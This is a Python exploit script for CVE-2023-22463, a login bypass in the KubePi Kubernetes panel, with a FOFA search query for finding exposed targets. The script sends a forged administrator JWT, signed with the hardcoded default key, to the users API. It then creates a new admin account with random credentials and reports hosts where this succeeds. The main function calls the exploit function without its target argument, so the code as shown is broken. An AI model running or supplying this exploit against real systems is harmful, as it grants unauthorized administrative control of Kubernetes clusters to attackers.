#fofa :"kubepi"
#导包
import requests,sys,argparse,json
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """
 _     ____  _____ _  _        ____ ___  _ ____  ____  ____  ____ 
/ \   /  _ \/  __// \/ \  /|  /  _ \\  \///  __\/  _ \/ ___\/ ___\
| |   | / \|| |  _| || |\ ||  | | // \  / |  \/|| / \||    \|    \
| |_/\| \_/|| |_//| || | \||  | |_\\ / /  |  __/| |-||\___ |\___ |
\____/\____/\____\\_/\_/  \|  \____//_/   \_/   \_/ \|\____/\____/
                                                                  
                                                                  
                                                                  
                                                                  
                                                                  
                                                                  
                                                                  


"""
    print(test)
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description='KubePi JwtSigKey 登陆绕过漏洞CVE-2023-22463')
    parser.add_argument('-url','--url',dest='url',type=str,help='input your url')
    args = parser.parse_args()
    if args.url:
        poc()
    else:
        print(f'Usage:\n\t python3 {sys.argv[0]}-h')
    


#poc函数
def poc(target):
    payload = '/kubepi/api/v1/users'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36',
        'accept': 'application/json',
        'Accept-Encoding': 'gzip, deflate',
        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8'
    }
    data = {
        "authenticate": {"password": "{{randstr}}"},
        "email": "{{randstr}}@qq.com",
        "isAdmin": "true",
        "mfa": {"enable": "false"},
        "name": "{{randstr}}",
        "nickName": "{{randstr}}",
        "roles": ["Supper User"]
}
    res = requests.post(url=target + payload,headers=headers,json=data,verify=False)
    if res.status_code == 200 and "data" in res.text:
        print(f'[+]{target}存在漏洞')
    else:
        print(f'[-]{target}不存在漏洞')

#函数入口
if __name__ =='__main__':
    main()
